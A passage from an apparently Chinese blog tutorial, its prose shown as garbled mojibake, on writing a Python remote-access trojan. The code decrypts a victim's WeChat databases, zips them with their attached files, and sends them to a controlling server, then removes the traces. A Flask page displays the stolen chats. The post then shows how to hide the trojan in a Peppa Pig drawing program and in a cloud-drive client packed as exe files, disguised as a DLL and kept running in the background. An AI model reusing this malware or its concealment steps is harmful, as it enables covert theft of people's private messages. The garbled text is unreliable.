</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=c1># è·å–è§£å¯†åçš„æ•°æ®åº“è·¯å¾„</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted_path</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># åˆ›å»ºè§£å¯†åçš„æ•°æ®åº“æ–‡ä»¶å¤¹</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># è§£å¯†å¾®ä¿¡æ•°æ®åº“</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mode&#34;</span><span class=p>:</span> <span class=s2>&#34;decrypt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=n>key</span><span class=p>,</span>  <span class=c1># å¯†é’¥</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;db_path&#34;</span><span class=p>:</span> <span class=n>file_path</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>Msg&#39;</span><span class=p>,</span>  <span class=c1># æ•°æ®åº“è·¯å¾„</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;out_path&#34;</span><span class=p>:</span> <span class=n>decrypted_path</span>  <span class=c1># è¾“å‡ºè·¯å¾„ï¼ˆå¿…é¡»æ˜¯ç›®å½•ï¼‰</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>batch_decrypt</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=s2>&#34;key&#34;</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;db_path&#34;</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;out_path&#34;</span><span class=p>],</span> <span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># æ‰“åŒ…å‹ç¼©è§£å¯†åçš„æ•°æ®åº“å¹¶å‘é€åˆ°æœåŠ¡ç«¯</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_path</span> <span class=o>=</span> <span class=n>decrypted_path</span> <span class=o>+</span> <span class=s1>&#39;.zip&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_name</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span><span class=o>.</span><span class=n>name</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_dir</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>,</span> <span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span>  <span class=c1># è®°å½•å½“å‰è·¯å¾„</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>Path</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>)</span><span class=o>.</span><span class=n>parent</span><span class=p>))</span>  <span class=c1># åˆ‡æ¢åˆ°çˆ¶ç›®å½•</span>
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>zip_file_name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>  <span class=c1># åˆ é™¤å‹ç¼©åŒ…</span>
</span></span><span class=line><span class=cl>    <span class=n>shutil</span><span class=o>.</span><span class=n>rmtree</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>)</span>  <span class=c1># åˆ é™¤è§£å¯†åçš„æ•°æ®åº“æ–‡ä»¶å¤¹</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>  <span class=c1># åˆ‡æ¢å›åŸè·¯å¾„</span>
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  <span class=c1># æ¥æ”¶æœåŠ¡ç«¯çš„ç¡®è®¤ä¿¡æ¯</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;get_db_ok&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=c1># æ‰“åŒ…å‹ç¼©FileStorageæ–‡ä»¶å¤¹å¹¶å‘é€åˆ°æœåŠ¡ç«¯</span>
</span></span><span class=line><span class=cl>    <span class=n>file_storage_path</span> <span class=o>=</span> <span class=n>file_path</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>FileStorage&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_path</span> <span class=o>=</span> <span class=n>file_storage_path</span> <span class=o>+</span> <span class=s1>&#39;.zip&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_name</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span><span class=o>.</span><span class=n>name</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_dir</span><span class=p>(</span><span class=n>file_storage_path</span><span class=p>,</span> <span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span>  <span class=c1># è®°å½•å½“å‰è·¯å¾„</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>  <span class=c1># åˆ‡æ¢åˆ°çˆ¶ç›®å½•</span>
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>zip_file_name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>  <span class=c1># åˆ é™¤å‹ç¼©åŒ…</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>  <span class=c1># åˆ‡æ¢å›åŸè·¯å¾„</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214356.png alt=è·å–å¾®ä¿¡èŠå¤©æ•°æ®åº“></p><p>å¼€å¯flaskæœåŠ¡ï¼ŒæŸ¥çœ‹å¾®ä¿¡èŠå¤©ä¿¡æ¯ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>flask_show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># æŸ¥çœ‹èŠå¤©è®°å½•</span>
</span></span><span class=line><span class=cl>    <span class=n>seg</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;[*] è¯·è¾“å…¥æ•°æ®åº“åˆ†æ®µå·ï¼š&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mode&#34;</span><span class=p>:</span> <span class=s2>&#34;dbshow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;msg_path&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>db_path</span><span class=p>)</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>Multi</span><span class=se>\\</span><span class=s1>de_MSG</span><span class=si>{</span><span class=n>seg</span><span class=si>}</span><span class=s1>.db&#39;</span><span class=p>,</span>  <span class=c1># è§£å¯†åçš„ MSG.db çš„è·¯å¾„</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;micro_path&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>db_path</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>de_MicroMsg.db&#39;</span><span class=p>,</span>  <span class=c1># è§£å¯†åçš„ MicroMsg.db çš„è·¯å¾„</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;media_path&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>db_path</span><span class=p>)</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>Multi</span><span class=se>\\</span><span class=s1>de_MediaMSG</span><span class=si>{</span><span class=n>seg</span><span class=si>}</span><span class=s1>.db&#39;</span><span class=p>,</span>  <span class=c1># è§£å¯†åçš„ MediaMSG.db çš„è·¯å¾„</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filestorage_path&#34;</span><span class=p>:</span> <span class=n>local_file_storage_path</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>FileStorage&#34;</span>  <span class=c1># æ–‡ä»¶å¤¹ FileStorage çš„è·¯å¾„ï¼ˆç”¨äºæ˜¾ç¤ºå›¾ç‰‡ï¼‰</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1># å¯åŠ¨flaskæœåŠ¡</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>g</span>
</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>,</span> <span class=n>template_folder</span><span class=o>=</span><span class=s1>&#39;./show_chat/templates&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># é˜»æ­¢flaskåœ¨æ§åˆ¶å°è¾“å‡ºæ—¥å¿—</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span> <span class=o>=</span> <span class=n>logging</span><span class=o>.</span><span class=n>getLogger</span><span class=p>(</span><span class=s1>&#39;werkzeug&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>setLevel</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>ERROR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>setLevel</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>ERROR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.before_request</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>before_request</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>MSG_ALL_db_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;msg_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>MicroMsg_db_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;micro_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>MediaMSG_all_db_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;media_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>FileStorage_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;filestorage_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>USER_LIST</span> <span class=o>=</span> <span class=n>get_user_list</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=s2>&#34;msg_path&#34;</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;micro_path&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/shutdown&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>shutdown</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>shutdown_func</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;werkzeug.server.shutdown&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>shutdown_func</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s1>&#39;Not running with the Werkzeug Server&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>shutdown_func</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Server shutting down...&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>register_blueprint</span><span class=p>(</span><span class=n>app_show_chat</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] æŸ¥çœ‹èŠå¤©è®°å½•æœåŠ¡å¯åŠ¨åœ¨ http://127.0.0.1:5000 &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214405.png alt=åœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹èŠå¤©è®°å½•></p><h2 id=æœ¨é©¬ç¨‹åº>æœ¨é©¬ç¨‹åº</h2><h3 id=peppa-pig>peppa-pig</h3><p>å®Œæˆä¸Šé¢çš„å‡ ä¸ªåŠŸèƒ½å°±å·²ç»å…·å¤‡ç®€å•è¿œæ§æœ¨é©¬çš„ç‰¹å¾äº†ï¼Œæ¥ç€å°±æ˜¯éœ€è¦å°†è¿™ä¸ªç¨‹åºéšè—èµ·æ¥ï¼Œè®©å¯¹æ–¹å¯Ÿè§‰ä¸åˆ°è¿™ä¸ªç¨‹åºçš„å­˜åœ¨</p><p>æˆ‘çš„æ€è·¯æ˜¯å°†è¿™ä¸ªè¿œç¨‹æ§åˆ¶çš„ç¨‹åºéšè—åœ¨å…¶ä»–åº”ç”¨ä¸­ï¼Œå¹¶ä¸”ä»¥å¤šçº¿ç¨‹æˆ–è€…å¤šè¿›ç¨‹çš„æ–¹å¼å¼‚æ­¥çš„è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œå¹¶ä¸”åœ¨å¯¹æ–¹å…³é—­åº”ç”¨ä¹‹åï¼Œè¿™ä¸ªè¿œç¨‹ç¨‹åºä¾æ—§èƒ½åœ¨åå°è¿è¡Œ</p><p>é¦–å…ˆæˆ‘æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨æµ·é¾Ÿç»˜å›¾ç»˜åˆ¶å°çŒªä½©å¥‡çš„ç¨‹åºï¼Œç¨‹åºæ˜¯ <a href=https://github.com/jackfrued/Python-100-Days>Python-100-Days</a> è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œæ¥ç€æˆ‘å°†è¿œæ§ç¨‹åºå¼•å…¥ï¼Œä»¥å¤šçº¿ç¨‹çš„æ–¹å¼å¯åŠ¨ï¼Œæœ€åå°†æ•´ä¸ªç¨‹åº<a href=https://blog.csdn.net/weixin_43804047/article/details/119704965>æ‰“åŒ…æˆexeå¯æ‰§è¡Œç¨‹åº</a></p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203844.png alt=ç»˜åˆ¶å°çŒªä½©å¥‡ç¨‹åº>
æ·»åŠ å¤šçº¿ç¨‹ä»£ç ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>    <span class=c1># å¤šçº¿ç¨‹  </span>
</span></span><span class=line><span class=cl>    <span class=n>t1</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>peppa_pig</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>t2</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>client_main</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>t1</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>t2</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>t1</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>t2</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span></code></pre></div><p>ä½¿ç”¨pyinstalleræ‰“åŒ…</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>pyinstaller</span> <span class=o>-F</span> <span class=n>-w</span> <span class=n>-n</span> <span class=n>pig</span> <span class=n>-i</span> <span class=n>icon</span><span class=p>.</span><span class=py>ico</span> <span class=n>peppa_pig</span><span class=p>.</span><span class=py>py</span>
</span></span></code></pre></div><p>éœ€è¦åŠ å…¥èµ„æºæ—¶</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>pyinstaller</span> <span class=o>-F</span> <span class=n>-w</span> <span class=n>-n</span> <span class=n>pig</span> <span class=n>-i</span> <span class=p>.\</span><span class=n>icon</span><span class=p>.</span><span class=py>ico</span> <span class=p>-</span><span class=n>-add-data</span><span class=p>=</span><span class=s2>&#34;.\assets\version_list.json;.&#34;</span> <span class=p>.\</span><span class=n>peppa_pig</span><span class=p>.</span><span class=py>py</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203909.png alt=æ‰“åŒ…æˆexeæ–‡ä»¶>
å¯¹æ–¹ç‚¹å‡»è¿è¡Œè¿™ä¸ªç¨‹åºä¹‹åï¼Œè¿œç¨‹æ§åˆ¶ç¨‹åºåŒæ—¶ä»¥çº¿ç¨‹çš„å½¢å¼è¿›è¡Œè¿è¡Œï¼Œå½“å¯¹è±¡å…³é—­ç»˜å›¾æ¡†æ—¶ï¼Œè¿œæ§ç¨‹åºçš„çº¿ç¨‹è¿˜æ˜¯ä¼šåœ¨åå°ç»§ç»­è¿è¡Œï¼Œå¯¹æ–¹åªè¦ä¸æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨æ—¶éš¾ä»¥å¯Ÿè§‰åˆ°çš„</p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203930.png alt=åœ¨åå°è¿è¡Œçš„pig.exe></p><h3 id=é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯>é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯</h3><p>ç»“åˆä¹‹å‰å†™çš„ä¸€ä¸ª<a href=https://pi3yyy.love/archives/7c353064.html>é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯</a>çš„é¡¹ç›®ï¼Œæˆ‘ä¹Ÿå°†æœ¨é©¬å¼•å…¥</p><p>è¿™æ¬¡çš„å¼•å…¥æ–¹å¼åŒä¸Šé¢çš„æœ‰æ‰€ä¸åŒï¼Œç”±äºä¸Šé¢ä»¥å¤šçº¿ç¨‹çš„æ–¹å¼å¼•å…¥ï¼Œè€Œåœ¨Windowsä»»åŠ¡ç®¡ç†å™¨ä¸­åªä¼šæ˜¾ç¤ºè¿›ç¨‹ï¼Œæ‰€ä»¥è¿˜æ˜¯pig.exeçš„ç¨‹åºæ­£åœ¨è¿è¡Œï¼Œå¯¹æ–¹å®¹æ˜“å¯Ÿè§‰åˆ°</p><p>è¿™ä¸ªæˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œå…ˆå°†è¿œæ§ç¨‹åºæ‰“åŒ…æˆexeå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ›¿æ¢å…¶å›¾æ ‡ä¸ºåŠ¨æ€é“¾æ¥åº“çš„å›¾æ ‡ï¼Œå¹¶ä¸”å°†åå­—è®¾ç½®ä¸ºå¾ˆé•¿çš„ä¸€ä¸²ã€‚</p><p>æ¥ç€åœ¨é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯ç¨‹åºä¸­ï¼Œä»¥<font color=#00b0f0>å¤šè¿›ç¨‹</font>çš„æ–¹å¼æ‰§è¡Œè¿™ä¸ªè¿œæ§exeç¨‹åºï¼Œæœ€åå°†é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯æ‰“åŒ…æˆexeæ–‡ä»¶ï¼Œå°†è¿œæ§ç¨‹åºè—åœ¨æ‰“åŒ…åçš„ä¾èµ–æ–‡ä»¶å¤¹ä¸­</p><p>æ·»åŠ å¤šè¿›ç¨‹ä»£ç </p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>	<span class=c1># å¤šè¿›ç¨‹</span>
</span></span><span class=line><span class=cl>    <span class=n>multiprocessing</span><span class=o>.</span><span class=n>freeze_support</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>multiprocessing</span><span class=o>.</span><span class=n>Process</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>run_client</span><span class=p>)</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>()</span>
</span></span></code></pre></div><p>ä½¿ç”¨pyinstallerè¿›è¡Œæ‰“åŒ…</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>pyinstaller</span> <span class=n>-D</span> <span class=n>-w</span> <span class=n>-n</span> <span class=n>QE_Network_Drive</span> <span class=n>-i</span> <span class=n>icon</span><span class=p>.</span><span class=py>ico</span> <span class=n>flet_GUI</span><span class=p>.</span><span class=py>py</span>
</span></span></code></pre></div><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šçš„åŠæ³•ï¼Œéƒ½ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼šåœ¨Pycharmä¸‹è¿è¡Œæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æ‰“åŒ…åè¿è¡Œexeç¨‹åºï¼Œæ•´ä¸ªç”µè„‘ç›´æ¥å¡æ­»ï¼Œå†…å­˜çˆ†æ»¡ï¼Œæœ€åç›´æ¥é‡å¯ã€‚</p><p>è§£å†³åŠæ³•å°±æ˜¯<a href=https://blog.csdn.net/Owen_goodman/article/details/115521388>ä½¿ç”¨multiprocessing.freeze_support()</a></p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201225942.png alt=æ‰“åŒ…ä¹‹åæ–‡ä»¶ç»“æ„>
<img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230034.png alt=éšè—åœ¨ä¾èµ–æ–‡ä»¶ä¸­çš„è¿œæ§ç¨‹åº>
<img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230240.png alt=å…³é—­äº‘ç›˜å®¢æˆ·ç«¯åä¾æ—§åœ¨åå°è¿è¡Œçš„è¿œæ§ç¨‹åº></p><p>ä¸è¿‡åç»­è¿˜æ˜¯éœ€è¦å°†è¿™ä¸ªè¿œæ§ç¨‹åºå›¾æ ‡å’Œåç§°æ”¹çš„æ›´åŠ åˆé€‚ä¸€ç‚¹ï¼Œæ¯•ç«ŸdllåŠ¨æ€é“¾æ¥åº“æ€ä¹ˆå¯èƒ½åœ¨åå°è¿è¡Œ</p><h2 id=æ€»ç»“>æ€»ç»“</h2><p>æ•´ä¸ªé¡¹ç›®æˆ–è€…è¯´æ˜¯ç¨‹åºï¼Œæ€»ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå¾ˆéš¾çš„ç‚¹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ç”¨åˆ°æœ€å¤šçš„å°±æ˜¯<strong class=chinese>è®¡ç®—æœºç½‘ç»œ</strong>å’Œ<strong class=chinese>ç½‘ç»œç¼–ç¨‹</strong>ä¸­çš„çŸ¥è¯†ç‚¹ï¼Œäºæ­¤åŒæ—¶ï¼Œæœ€åéƒ¨åˆ†ä¹Ÿæ¶‰åŠåˆ°äº†Python<strong class=chinese>å¼‚æ­¥ç¼–ç¨‹</strong>ï¼Œ<strong class=chinese>å¤šçº¿ç¨‹</strong>ï¼Œ<strong class=chinese>å¤šè¿›ç¨‹</strong>ä»¥åŠ<strong class=chinese>åç¨‹</strong>çš„æ¦‚å¿µï¼Œå®Œæˆè¿™ä¸ªç¨‹åºä¹Ÿç®—æ˜¯å·©å›ºå’Œè¡¥å……äº†è¿™äº›æ–¹é¢çš„çŸ¥è¯†ï¼Œå¼¥è¡¥äº†ä¸€äº›ä¸æ‡‚çš„åœ°æ–¹ï¼Œç°åœ¨å†™ä¸‹æ¥ä¹Ÿç®—æ˜¯å›é¡¾æ€»ç»“å­¦åˆ°çš„çŸ¥è¯†ç‚¹ã€‚</p></article><div class=paginator><a class=link href=https://blog.pi3.fun/post/2023/11/netcat%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/>â† prev</a>
<a class=link href=https://blog.pi3.fun/post/2023/12/%E5%9F%BA%E4%BA%8Eudp%E7%9A%84%E5%A4%9A%E4%BA%BA%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%AE%A4/>next â†’</a></div><div class=comment><div id=tcomment></div><script src=https://registry.npmmirror.com/twikoo/1.6.39/files/dist/twikoo.min.js></script><script async>twikoo.init({envId:"https://twikoo.pi3.fun/.netlify/functions/twikoo",el:"#tcomment",lang:"zh-CN"})</script></div></main><footer id=footer><div><span style=display:flex;align-items:center><span style=margin-right:.5rem>Â© 2021 - 2025</span><img src=https://cdn.pi3.fun/static/rainbow.gif loading=lazy width=20 alt=rainbow><span style=margin-left:.5rem>By Liu Chao</span></span></div><div class=footnote><span><a href=https://www.foreverblog.cn/ target=_blank><img src=https://img.foreverblog.cn/logo_en_default.png style=width:auto;height:16px></a> | <a class=link href=https://blogscn.fun/ target=_blank><img src=https://photo.xiangming.site/img/blogscn.png style=width:auto;height:15px></a><br><a class=link href=/index.xml><span class="iconfont icon-RSS"></span></a> | <a class=link href=https://github.com/Pi3-l22 target=_ blank><span class="iconfont icon-GitHub"></span></a> | <a class=link 